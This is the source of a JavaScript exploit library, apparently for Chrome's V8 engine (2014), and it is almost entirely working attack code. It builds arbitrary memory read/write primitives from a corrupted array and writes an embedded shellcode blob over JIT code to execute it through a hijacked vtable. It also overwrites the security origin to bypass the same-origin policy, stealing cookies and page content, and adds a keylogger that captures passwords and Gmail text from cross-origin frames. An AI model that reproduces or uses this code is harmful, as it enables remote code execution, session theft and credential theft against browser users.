/*
 * Author: Chen Zhang (@demi6od) <demi6d@gmail.com>
 * Date: 2014 May 23rd
 */

/*                 Sprayed memory chunks layout 
                     ------------------------
                     |size|flags|aStart|aEnd|
                     |  ...                 |
                     ------------------------
                     |  00000000            |
                     |  ...                 |
                     |  00000000            |
                     ------------------------
 aStrat & arrAddr -> |map|length|           |
                     ------------
                     |  arrBuf pointer | 1  |
                     |  arrBuf pointer | 1  |
                     |  arrBuf pointer | 1  |
                     |  ...                 |
                     |  number << 1         |
                     |  number << 1         |
                     |  number << 1         |
                     |  ...                 |
                     ------------------------
                     |  ...                 |
                     ------------------------
                     |map|length|           |
                     ------------
                     |  arrBuf pointer | 1  |
                     |  arrBuf pointer | 1  |
                     |  arrBuf pointer | 1  |
                     |  ...                 |
                     |  number << 1         |
                     |  number << 1         |
                     |  number << 1         |
                     |  ...                 |
                     ------------------------
                     |  arrBuf              |
                     |                      |
                                -------------
                     |          |           |
                     ------------
                     |  arrBuf              |
                     |                      |
                     ------------------------
                     |  arrBuf              |
                     |                      |
                                -------------
                     |          |           |
                     ------------
                     |  arrBuf              |
                     |                      |
                     ------------------------
                     |  ...                 |
                     ------------------------

    fixedArrs [in]: Array of fixedArrs, one fixedArr's length will be modified through vulnerability.

    description: 
    1. Use vulnerability to modify the length of one fixedArr
    2. Use modified fixedArr to out-of-bound write the length and arrayData address of two array buffer. 
       First array buffer:  length -> 0x7ffffff8, address -> 0
       Second array buffer: length -> 0x7ffffff0, address -> 0x40000000
    3. Create two DataView(Uint32Array) based on modified array buffer to achieve arbitrary read and write within ring3 address.
    4. Put any object on the modified fixedArr and read arrAddr plus item offset will leak that object's address.
*/ 

// Namespace
var cmExpLib = {};

cmExpLib.initialize = function(fixedArrs, fixedArrSize, arrBufSize, arrDataSize, arrAddr) {
    cmExpLib.fixedArrs = fixedArrs;

    // The first item of leakArr is used to leak object address
    cmExpLib.leakArr = [];
    cmExpLib.leakArrAddr = arrAddr + 0x8;

    // The two typedArrs in fixedArrs is use for arbitrary ring3 address read and write
    cmExpLib.typedArrFst = [];
    cmExpLib.typedArrSnd = [];

    cmExpLib.fixedArrSize = fixedArrSize;
    cmExpLib.arrBufSize = arrBufSize;
    cmExpLib.arrDataSize = arrDataSize;

    getExpArr();
};

// Create two exploit typed arrays through modified fixed array
function getExpArr() {
    var pageSize = 0x100000;
    var map = 0x4;
    var length = 0x4;
    var fixedArrLen = (cmExpLib.fixedArrSize - map - length) / 4;
    var isFound = false;

    for (var i = 0; i < cmExpLib.fixedArrs.length; i++) {
        if (cmExpLib.fixedArrs[i][fixedArrLen + 1] != undefined) {
            console.log('[+] Find modified fixed array');
            cmExpLib.leakArr = cmExpLib.fixedArrs[i];
            
            for (var j = fixedArrLen + 4; j < (0x100000 / 4); j += (cmExpLib.fixedArrSize / 4)) {
                if (cmExpLib.fixedArrs[i][j] == cmExpLib.arrDataSize) {
                    console.log('[+] Find typed array');

                    // Create first exploit typed array range from 0 to 0x400000000
                    // Address: 0, size: 0x7ffffff8 >> 1
                    cmExpLib.fixedArrs[i][j - 1] = dword2Int(0);
                    cmExpLib.fixedArrs[i][j] = dword2Int(0x7ffffff8);

                    // Create second exploit typed array range from 0x400000000 to 0x800000000
                    // Address: 0x400000000, size 0x7ffffff0 >> 1
                    cmExpLib.fixedArrs[i][j + 10 - 1] = dword2Int(0x40000000);
                    cmExpLib.fixedArrs[i][j + 10] = dword2Int(0x7ffffff0);

                    // Restore modified fixedArr in case of GC crash
                    cmExpLib.fixedArrs[i].length = fixedArrLen;

                    isFound = true;
                    break;
                }
            }
        }

        if (isFound) {
            break;
        }
    }

    if (!isFound) {
        console.log('[-] Error: Failed to create exploit typed array!');
    }

    // Get exploit typed arrays
    var isFoundFst = false;
    var isFoundSnd = false;
    var arrBufNum = cmExpLib.arrBufSize / 0x28;

    for (var i = 0; i < cmExpLib.fixedArrs.length; i++) {
        for (var j = 0; j < arrBufNum; j++) {
            var typedArr = new Uint32Array(cmExpLib.fixedArrs[i][j]);
            if (typedArr.length == (0x7ffffff8 >> 1) / 4) {
                console.log('[+] Get first exploit typed array');
                cmExpLib.typedArrFst = typedArr;
                isFoundFst = true;
            }

            if (typedArr.length == (0x7ffffff0 >> 1) / 4) {
                console.log('[+] Get second exploit typed array');
                cmExpLib.typedArrSnd = typedArr;
                isFoundSnd = true;
            }
        }

        if (isFoundFst && isFoundSnd) {
            break;
        }
    }
}

function leakAddr(obj) {
    cmExpLib.leakArr[0] = obj;
    // Restore the tagged pointer of GC
    var addr = readDWord(cmExpLib.leakArrAddr) - 1;
    return addr;
}

function readDWord(addr) {
    if (addr < 0x40000000) {
        var result = readDWordEx(addr, cmExpLib.typedArrFst);
    } else if (addr < 0x80000000) {
        var result = readDWordEx(addr - 0x40000000, cmExpLib.typedArrSnd);
    } else {
        console.log('[-] Error: readDWord address ' + addr + ' is out of range!');
        var result = -1;
    }

    return result;
}

function writeDWord(addr, value) {
    if (addr < 0x40000000) {
        writeDWordEx(addr, value, cmExpLib.typedArrFst);
    } else if (addr < 0x80000000) {
        writeDWordEx(addr - 0x40000000, value, cmExpLib.typedArrSnd);
    } else {
        console.log('[-] Error: writeDWord address ' + addr + ' is out of range!');
    }
}

function readDWordEx(addr, typedArr) {
    var align = addr % 4;

    var dwordLow = typedArr[(addr - align) / 4];
    var dwordHigh = typedArr[(addr - align + 4) / 4];

    if (align == 0) {
        var dword = dwordLow >>> (align * 8); 
    } else {
        var dword = (dwordHigh << (32 - align * 8)) | ((dwordLow >>> (align * 8)) >> 0); 
    }
    // Convert to unsinged int
    return dword >>> 0;
}

function writeDWordEx(addr, value, typedArr) {
    var align = addr % 4;

    var dwordLow = typedArr[(addr - align) / 4];
    valueLow = (value << (align * 8)) | (dwordLow & ((1 << (align * 8)) - 1));
    typedArr[(addr - align)/4] = valueLow;

    if (align != 0) {
        var dwordHigh = typedArr[(addr - align + 4) / 4];
        valueHigh = ((value >>> (32 - align * 8)) >> 0) | (dwordHigh & (0xffffffff << (align * 8)));
        typedArr[(addr - align + 4)/4] = valueHigh;
    }
}

function readByte(addr) {
    return (readDWord(addr) & 0xff);
}

function writeByte(addr, value) {
    var oriDWord = readDWord(addr);
    writeDWord(addr, (oriDWord & 0xffffff00) | (value & 0xff));
}

function writeBytes(addr, bytes) {
    for (var i = 0; i < bytes.length; i++) {
        writeByte(addr + i, bytes[i]);
    }
}

function writeStringW(addr, str) {
    var bytes = [];
    for (var i = 0 ; i < str.length; i++) {
        bytes[i * 2] = str.charCodeAt(i);
        bytes[i * 2 + 1] = 0;
    }

    bytes[str.length * 2] = 0;
    bytes[str.length * 2 + 1] = 0;

    writeBytes(addr, bytes);
}

function memcpy(dst, src, size) {
    for (var i = 0; i < size; i += 4) {
        var dword = readDWord(src + i); 
        writeDWord(dst + i, dword);
    }
}

function getModuleBase(curAddr) {
    while (curAddr > 0) {
        var lowWord = readDWord(curAddr) & 0xffff;
        if (lowWord == 0x5a4d) {
            return curAddr;
        } else {
            curAddr -= 0x10000;
        }
    }

    return -1;
}

function search(pat, start, end) {
    if (start + pat.length > end) {
        return -1;
    }

    for (var pos = start; pos < end; pos++) {
        var isFound = true;
        for (var i = 0; i < pat.length; i++) {
            if (readByte(pos + i) != pat[i]) {
                isFound = false;
                break;
            }
        }
        if (isFound) {
            return pos;
        }
    }

    return -1;
}

function runShellcode() {
    //parseFloat('1.1');
    if (IS_MOD_VTBL) {
        var funcCodeStr = 'console.log("[+] Spray the JIT code to ensure the memory space for shellcode");';
        var shellExp = 6;
        for (var i = 0; i < shellExp; i++) {
            funcCodeStr += funcCodeStr; 
        }

        eval(funcCodeStr);
    } else {
        console.log('[-] Error: Code entry stub of this function should be overwritten by shellcode');
    }

}

cmExpLib.exploit = function() {
    if (IS_MOD_VTBL) {
        // Let v8 JIT compile the function code
        runShellcode();
    }

    var jsFuncAddr = leakAddr(runShellcode);
    console.log('[+] JSFunction address: ' + jsFuncAddr.toString(16));

    var codeEntry = readDWord(jsFuncAddr + 0x0c);
    console.log('[+] Code entry address: ' + codeEntry.toString(16));

    // Calc shellcode
    var shellcode = unescape('%u372f%ufc13%u4305%ub690%u46bf%u497f%u2ab7%u38d5%ubed4%u3d3f%u307d%uf8d0'
        + '%u99b8%ue289%ub148%u7c9b%u2776%ub441%ub093%u4291%ubb67%u3c25%u35b2%ub9ba%uf969%u6698%u342c%ua914'
        + '%u7e70%u2c14%uff23%uc0c6%u73e1%u7b4a%u2871%u04f9%u2dba%ud387%u7de3%u377c%u91b7%u7775%ube46%u2798'
        + '%ue083%u934e%u187a%u4be2%u7f92%u2078%u3cd5%u7472%u4847%u968d%u9b49%ud003%ub2d4%ua89f%u4f15%ub8b0'
        + '%u6690%u1d3f%ub697%u24bb%u700d%u9905%ud613%u79a9%u340c%ub440%ufc2b%u08b1%ub9fd%u41b3%u4235%u7625'
        + '%u0b1c%u39f5%uebf7%u433d%ub52f%u67bf%u7b77%u1b73%u96f8%u3b46%uc7fe%ufcc0%u76b5%u7a3c%u697e%ue1f6'
        + '%u7574%u4024%u7190%u0d48%ue08c%u1079%ub0d4%u1c70%u4a4f%u7205%u4167%u2d99%u9fbf%ubb8d%u7cb6%u983d'
        + '%ub493%u2504%u91b2%u4992%uba34%ue30a%u0c7f%u357d%ud619%u97be%u3066%u88d5%u86fd%ub8f5%uf884%ue289'
        + '%u374e%u47b9%u432c%u7815%u1427%u421d%u4b9b%u31a8%u12eb%u3ff9%ub3b7%ub1a9%u777d%u2f75%u93b5%ud580'
        + '%ubbb8%ub94b%u6649%u8d3f%u91b1%ube04%u1c73%ud129%ub7d6%u7b42%u9043%u357c%u2337%ub6fd%u92a8%ue211'
        + '%u7125%u7270%ue122%u7e7a%u962c%ub248%u2499%u4a79%ud428%ub3a9%u092d%u97f8%u0db0%u7678%u343c%u1a9b'
        + '%ue3d2%ubf05%u1d9f%uf933%ub441%ueb81%uba3d%ufc6b%u470c%u4015%u984e%ue002%u2f67%u4f27%u7414%u387f'
        + '%u72f5%u217e%uc1ff%u46e3%ub7b9%u8590%u41f8%ue22a%u4e71%ub28d%ud43a%u7db4%uf601%u46d5%u2d7b%u992c'
        + '%uf989%u3215%u25fd%ud687%u7543%ubb14%ue029%u017c%u7fe1%u7076%u3577%u3c1d%uf532%u4f48%ubf05%u7a98'
        + '%u111c%u24eb%u0474%u3d73%u3abe%u40fc%ub034%ub6b8%u3f78%u4ba9%u490c%u0d67%ub3b1%u3779%u4797%u2f91'
        + '%u664a%u9242%uba93%u9f96%u27b5%ua89b%u912c%u7767%u9b15%u43b5%ub046%u2171%ue2d3%u8c42%u25e3%u4072'
        + '%uf880%u1024%ub9d5%u1298%ud2f7%ub4fd%u7437%u9204%u99b6%uf931%u287c%u47f5%u2f73%u7d75%u3c78%ub790'
        + '%ub30d%u7a76%u3f70%u4105%ud609%uba35%u7eb2%u9f34%u3379%ue0c0%u4f3d%u1c7f%ube1d%ubf97%ueb3b%u664b'
        + '%u0a48%ub8fc%u27a9%u93b1%u0c4e%u49bb%u8d14%u4a7b%u96a8%u1b2d%u20d4%u7ce1%u7e40%u7b73%u9734%u7899'
        + '%ub666%ufd6b%u3976%u7deb%ue122%u187a%u2ae0%u08fc%u70e2%u862d%u91d6%ub2ba%u7298%u4a79%u7f41%u2c46'
        + '%u4992%u249f%u96be%ud11a%ue3c1%ubf47%u3da8%u758d%ua94f%uf888%u4b37%u4877%ub5b8%ub13c%u35b3%ubb2f'
        + '%u810d%ub7f9%u6771%u9b4e%ud584%ub40c%u2527%u0474%uf513%ue319%ub01d%u1471%u0270%u15e1%u1c76%u7493'
        + '%ueb38%ub942%ue285%ud030%u72d4%u903f%u0575%u4379%u1c7b%u477d%u467c%u78b4%u7335%u7a14%ufc23%ubf4a'
        + '%u3c7e%ub599%u2577%u4b2c%u488d%ub32f%u2bb1%u03f8%ub9f5%u37d5%u8315%ubad6%ub090%u93b6%u9f66%u0b4f'
        + '%u96d4%u6791%u6992%u24f9%u3f04%ufdbe%ua934%u4940%ub70d%u05e0%u7fb2%u420c%u1d97%ubb2d%u4eb8%ua89b'
        + '%u413d%u2743%ubd98%ucefd%u8d79%ucfda%u74d9%uf424%u3158%ub1c9%u8333%u04c0%u6831%u030e%uc095%u789b'
        + '%u3599%u83d2%uc661%u0a85%uf784%u6997%uaacd%uf927%u4683%uafc3%udc37%u67a1%u5538%u5e0f%u6677%u5ea1'
        + '%ua4db%u22a3%uf921%u1a03%u0cea%u5b45%ufe16%u3417%uad5d%u3187%u6e23%u95a9%uce28%u90d1%ubbee%u9a6b'
        + '%u133e%ud4e7%u1fa6%uc4af%uccd7%u39b3%u799e%uc907%ua821%u3259%u9410%u0d36%u199d%u4946%uc219%ua13d'
        + '%u7f5a%u7246%u5b21%u67c3%u2881%u4c73%ufc30%u07e2%u493e%u4f60%u4c22%ufba5%uc55e%u2c48%u9dd7%ue86e'
        + '%u46bc%ua90e%u2818%ua92f%u95c4%ua195%uc2e6%uebac%u146c%u963c%u16c9%u993e%u7f79%u120f%uf816%uf190'
        + '%uf653%u58da%u9ff5%u0882%uc244%ue734%ufb8a%u02b6%uf872%u66a7%u4477%u9a60%ud505%u9c05%ud6ba%uff0f'
        + '%u455d%u2ed3%uedf8%u2f76');

    var shellcodeObjAddr = leakAddr(shellcode);
    console.log('[+] Shellcode address: ' + shellcodeObjAddr.toString(16));

    var v8StrHeadLen = 0x0c; 
    var shellcodeAddr = shellcodeObjAddr + v8StrHeadLen;

    memcpy(codeEntry, shellcodeAddr, shellcode.length * 2);

    //parseFloat('1.1');
    if (IS_MOD_VTBL) {
        // Get anchor element virtual function table address
        var anchorElem = document.createElement('a');

        var v8AncAddr = leakAddr(anchorElem);
        console.log('[+] V8 anchor address: ' + v8AncAddr.toString(16));

        var ancAddr = readDWord(v8AncAddr + 0x10);
        console.log('[+] Anchor element address: ' + ancAddr.toString(16));

        var ancVtblAddr = readDWord(ancAddr);
        console.log('[+] Anchor virtual table address: ' + ancVtblAddr.toString(16));

        // Virtual table offset of tabIndex()
        if (IS_RELEASE) {
            var tabIndexOff = 0x90;
        } else {
            var tabIndexOff = 0x94;
        }

        // Use leakArr as fake vTbl
        cmExpLib.leakArr[tabIndexOff / 4] = codeEntry >> 1;

        // Overwrite the vPtr
        writeDWord(ancAddr, cmExpLib.leakArrAddr);

        // Call vritual function HTMLAnchorElement::tabIndex()
        anchorElem.tabIndex;
    } else {
        // Carry EIP to the JIT code stub
        runShellcode();
    }
};

function keylogger(iframeDoc) {
    keys = '';

    iframeDoc.onkeypress = function(e) {
        var get = window.event ? event : e;
        var key = get.keyCode ? get.keyCode : get.charCode;
        key = String.fromCharCode(key);
        keys += key;
    }

    setTimeout('alert("password: " + keys)', 10000);
    setTimeout('getMailContent()', 20000);
}

function getMailContent() {
    cmExpLib.exploitUXSSIfr(0, false)
    var pageContent = gIframes[0].contentDocument.body.innerHTML;
    var mailContent = pageContent.substring(pageContent.indexOf('Gmail Team'));
    //alert(pageContent.indexOf('Gmail Team'));
    alert(mailContent);
}

function crossOriAccessIfr(idx) {
    //parseFloat('1.1');

    // Set iframe page to the same origin again
    cmExpLib.exploitUXSSIfr(idx, false);

    // Get iframe document content and cookie
    var iframeDoc = gIframes[idx].contentDocument;
    console.log(iframeDoc);
    console.log(iframeDoc.body.innerHTML);

    if (IS_KEYLOG) {
        alert('[+] Start key logging!');
        keylogger(iframeDoc);
    } else {
        alert(iframeDoc.URL + '\n' + iframeDoc.cookie);
    }
}

function crossOriAccessWin(idx) {
    //parseFloat('1.1');

    // Get new window's document content and cookie
    var winDoc = gWins[idx].document;
    console.log(winDoc);
    console.log(winDoc.body.innerHTML);
    alert(winDoc.URL + '\n' + winDoc.cookie);
}

cmExpLib.exploitUXSSIfr = function(idx, isFirst) {
    // Get current security origin
    var v8DocAddr = leakAddr(document);
    console.log('[+] V8 document address: ' + v8DocAddr.toString(16));

    var docAddr = readDWord(v8DocAddr + 0x10);
    console.log('[+] Document address: ' + docAddr.toString(16));

    if (IS_RELEASE) {
        var secOriPtrAddr = docAddr + 0x5c;
    } else {
        var secOriPtrAddr = docAddr + 0x60;
    }
    console.log('[+] Security origin pointer address: ' + secOriPtrAddr.toString(16));

    var secOriAddr = readDWord(secOriPtrAddr);
    console.log('[+] Security origin address: ' + secOriAddr.toString(16));

    var hostPtrAddr = secOriAddr + 0x08;
    console.log('[+] Host pointer address: ' + hostPtrAddr.toString(16));

    var hostAddr = readDWord(hostPtrAddr);
    console.log('[+] Host address: ' + hostAddr.toString(16));

    var domainPtrAddr = secOriAddr + 0x0c;
    console.log('[+] Doamin pointer address: ' + domainPtrAddr.toString(16));

    var domainAddr = readDWord(domainPtrAddr);
    console.log('[+] Domain address: ' + domainAddr.toString(16));

    // Get iframe security origin
    var v8IfrAddr = leakAddr(gIframes[idx]);
    console.log('[+] V8 iframe address: ' + v8IfrAddr.toString(16));

    var ifrAddr = readDWord(v8IfrAddr + 0x10);
    console.log('[+] Iframe address: ' + ifrAddr.toString(16));

    if (IS_RELEASE) {
        contentFrPtrAddr = ifrAddr + 0x34;
    } else {
        contentFrPtrAddr = ifrAddr + 0x38;
    }
    console.log('[+] Content frame pointer address: ' + contentFrPtrAddr.toString(16));

    var contentFrAddr = readDWord(contentFrPtrAddr);
    console.log('[+] Content frame address: ' + contentFrAddr.toString(16));

    if (IS_RELEASE) {
        var frLoadClientAddr = readDWord(contentFrAddr + 0x74);
    } else {
        var frLoadClientAddr = readDWord(contentFrAddr + 0x5c);
    }
    console.log('[+] Frame loader client address: ' + frLoadClientAddr.toString(16));

    var webFrAddr = readDWord(frLoadClientAddr + 0x04);
    console.log('[+] Web frame address: ' + webFrAddr.toString(16));

    if (IS_RELEASE) {
        var frParentPtrAddr = webFrAddr + 0x04;
    } else {
        var frParentPtrAddr = webFrAddr + 0x20;
    }
    console.log('[+] Frame parent pointer address: ' + frParentPtrAddr.toString(16));

    if (IS_RELEASE) {
        var winAddr = readDWord(contentFrAddr + 0x14);
    } else {
        var winAddr = readDWord(contentFrAddr + 0x20);
    }
    console.log('[+] DOM window address: ' + winAddr.toString(16));

    if (IS_RELEASE) {
        var ifrDocAddr = readDWord(winAddr + 0x54);
    } else {
        var ifrDocAddr = readDWord(winAddr + 0x64);
    }
    console.log('[+] Iframe document address: ' + ifrDocAddr.toString(16));

    if (IS_RELEASE) {
        var ifrSecOriPtrAddr = ifrDocAddr + 0x5c;
    } else {
        var ifrSecOriPtrAddr = ifrDocAddr + 0x60;
    }
    console.log('[+] Iframe security origin pointer address: ' + ifrSecOriPtrAddr.toString(16));

    var ifrSecOriAddr = readDWord(ifrSecOriPtrAddr);
    console.log('[+] Iframe security origin address: ' + ifrSecOriAddr.toString(16));

    var ifrHostAddr = readDWord(ifrSecOriAddr + 0x08);
    console.log('[+] Iframe host address: ' + ifrHostAddr.toString(16));

    var ifrDomainAddr = readDWord(ifrSecOriAddr + 0x0c);
    console.log('[+] Iframe domain address: ' + ifrDomainAddr.toString(16));

    // Overwrite current security origin with that of iframe page to bypass the SOP
    //writeDWord(hostPtrAddr, ifrHostAddr);
    //writeDWord(domainPtrAddr, ifrDomainAddr);
    writeDWord(secOriPtrAddr, ifrSecOriAddr);
    //writeDWord(ifrSecOriPtrAddr, secOriAddr);
    
    if (isFirst) {
        // Forge the top frame
        writeDWord(frParentPtrAddr, 0);

        // Load page now
        gIframes[idx].src = urls[idx];

        setTimeout("crossOriAccessIfr(" + idx + ");", 5000);
    }
};

cmExpLib.exploitUXSSWin = function(idx) {
    // Get current security origin
    var v8DocAddr = leakAddr(document);
    console.log('[+] V8 document address: ' + v8DocAddr.toString(16));

    var docAddr = readDWord(v8DocAddr + 0x10);
    console.log('[+] Document address: ' + docAddr.toString(16));

    if (IS_RELEASE) {
        var secOriPtrAddr = docAddr + 0x5c;
    } else {
        var secOriPtrAddr = docAddr + 0x60;
    }
    console.log('[+] Security origin pointer address: ' + secOriPtrAddr.toString(16));

    var secOriAddr = readDWord(secOriPtrAddr);
    console.log('[+] Security origin address: ' + secOriAddr.toString(16));

    var hostPtrAddr = secOriAddr + 0x08;
    console.log('[+] Host pointer address: ' + hostPtrAddr.toString(16));

    var hostAddr = readDWord(hostPtrAddr);
    console.log('[+] Host address: ' + hostAddr.toString(16));

    var domainPtrAddr = secOriAddr + 0x0c;
    console.log('[+] Doamin pointer address: ' + domainPtrAddr.toString(16));

    var domainAddr = readDWord(domainPtrAddr);
    console.log('[+] Domain address: ' + domainAddr.toString(16));

    // Get window's security origin
    var jsWinAddr = leakAddr(gWins[idx]);
    console.log('[+] Javascript window address: ' + jsWinAddr.toString(16));

    var winAddr = readDWord(readDWord(readDWord(jsWinAddr) - 1 + 0x0c) - 1 + 0x20);
    console.log('[+] Window address: ' + winAddr.toString(16));

    if (IS_RELEASE) {
        var winDocAddr = readDWord(winAddr + 0x54);
    } else {
        var winDocAddr = readDWord(winAddr + 0x64);
    }
    console.log('[+] Window document address: ' + winDocAddr.toString(16));

    if (IS_RELEASE) {
        var winSecOriPtrAddr = winDocAddr + 0x5c;
    } else {
        var winSecOriPtrAddr = winDocAddr + 0x60;
    }
    console.log('[+] Window security origin pointer address: ' + winSecOriPtrAddr.toString(16));

    var winSecOriAddr = readDWord(winSecOriPtrAddr);
    console.log('[+] Window security origin address: ' + winSecOriAddr.toString(16));

    var winHostAddr = readDWord(winSecOriAddr + 0x08);
    console.log('[+] Window host address: ' + winHostAddr.toString(16));

    var winDomainAddr = readDWord(winSecOriAddr + 0x0c);
    console.log('[+] Window domain address: ' + winDomainAddr.toString(16));

    // Overwrite the security origin of new window's page with current one to bypass the SOP
    //writeDWord(hostPtrAddr, winHostAddr);
    //writeDWord(domainPtrAddr, winDomainAddr);
    //writeDWord(secOriPtrAddr, winSecOriAddr);
    writeDWord(winSecOriPtrAddr, secOriAddr);

    crossOriAccessWin(idx);
};

cmExpLib.expTestCase = function() {
    var obj = {a: 1, b: 2};
    var objAddr = leakAddr(obj);
    console.log('[+] Leak address: ' + objAddr.toString(16));

    var addr = cmExpLib.leakArrAddr + 0x60;
    console.log('[+] addr: ' + addr.toString(16));

    writeDWord(addr, 0xdeadc0de);
    writeDWord(addr + 0x10 + 1, 0xdeadc0de);
    writeDWord(addr + 0x20 + 2, 0xdeadc0de);
    writeDWord(addr + 0x30 + 3, 0xdeadc0de);
    writeDWord(addr + 0x4, 0xdeadc0de);
    writeByte(addr + 0x8, 0x43);
    writeByte(addr + 0xd, 0x43);

    console.log('[+] Read dword at ' + addr.toString(16) + ': ' + readDWord(addr).toString(16));
    console.log('[+] Read dword at ' + (addr + 0x10 + 1).toString(16) + ': ' + readDWord(addr + 0x10 + 1).toString(16));
    console.log('[+] Read dword at ' + (addr + 0x20 + 2).toString(16) + ': ' + readDWord(addr + 0x20 + 2).toString(16));
    console.log('[+] Read dword at ' + (addr + 0x30 + 3).toString(16) + ': ' + readDWord(addr + 0x30 + 3).toString(16));
    console.log('[+] Read byte at ' + (addr + 8).toString(16) + ': ' + readByte(addr + 8).toString(16));

    var dst = addr + 0x400;
    var src = addr + 0x200;
    console.log('[+] memcpy dst at ' + dst.toString(16) + ', src at ' + src.toString(16));
    memcpy(dst, src, 0x100); 

    var pat = [0xde, 0xc0, 0xad, 0xde]; 
    var pos = search(pat, addr, addr + 0xffff);
    console.log('[+] Pat pos: ' + pos.toString(16));
};

